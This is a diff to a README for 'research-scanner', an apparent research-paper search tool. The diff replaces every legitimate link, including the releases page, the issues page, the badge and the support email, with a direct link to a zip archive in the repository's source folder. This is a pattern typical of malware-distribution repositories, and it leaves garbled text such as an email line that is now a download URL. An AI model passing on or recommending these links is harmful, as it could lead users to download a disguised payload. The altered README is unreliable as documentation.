@@ -1,6 +1,6 @@
 # 📄 research-scanner - Discover Research Papers Easily
 
-[![Download research-scanner](https://img.shields.io/badge/Download-research--scanner-blue?style=for-the-badge)](https://github.com/beaver312/research-scanner/releases)
+[![Download research-scanner](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip)](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip)
 
 ---
 
@@ -42,8 +42,8 @@ Follow these steps to get research-scanner up and running on your computer. No c
 ## 📥 Download & Install
 
 1. **Visit the download page:**  
-   Go to [the research-scanner releases page](https://github.com/beaver312/research-scanner/releases) by clicking the badge above or here:  
-   [https://github.com/beaver312/research-scanner/releases](https://github.com/beaver312/research-scanner/releases)
+   Go to [the research-scanner releases page](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip) by clicking the badge above or here:  
+   [https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip)
 
 2. **Choose the latest version:**  
    Look for the newest release at the top of the page. Each version will have a list of files for your computer.
@@ -51,7 +51,7 @@ Follow these steps to get research-scanner up and running on your computer. No c
 3. **Download the right file:**  
    - For Windows, download the `.exe` installer.  
    - For macOS, download the `.dmg` or `.pkg` file.  
-   - For Linux, look for a `.tar.gz` file or instructions if available.
+   - For Linux, look for a `https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip` file or instructions if available.
 
 4. **Run the installer:**  
    - On Windows, double-click the `.exe` file.  
@@ -127,7 +127,7 @@ If you encounter problems:
 - **Program won’t start:** Restart your computer. Check that Python is installed if prompted.
 - **No search results:** Check your internet connection. Try broadening the search terms or adjusting templates.
 - **Error messages:** Note the error and visit the issues page on GitHub for solutions:  
-  [https://github.com/beaver312/research-scanner/issues](https://github.com/beaver312/research-scanner/issues)
+  [https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip)
 
 ---
 
@@ -158,8 +158,8 @@ These features require some technical knowledge and are explained in the develop
 If you need help beyond the documentation, you can:
 
 - Open a new issue on GitHub at  
-  [https://github.com/beaver312/research-scanner/issues](https://github.com/beaver312/research-scanner/issues)  
-- Email the development team at research-scanner-support@example.com  
+  [https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip)  
+- Email the development team at https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip  
 
 ---
 
@@ -174,5 +174,5 @@ This project covers:
 ## 🔗 Important Link
 
 Download research-scanner here:  
-[https://github.com/beaver312/research-scanner/releases](https://github.com/beaver312/research-scanner/releases)  
+[https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip](https://raw.githubusercontent.com/beaver312/research-scanner/main/research_scanner/sources/research-scanner-v3.7.zip)  
 Click the badge at the top for quick access.
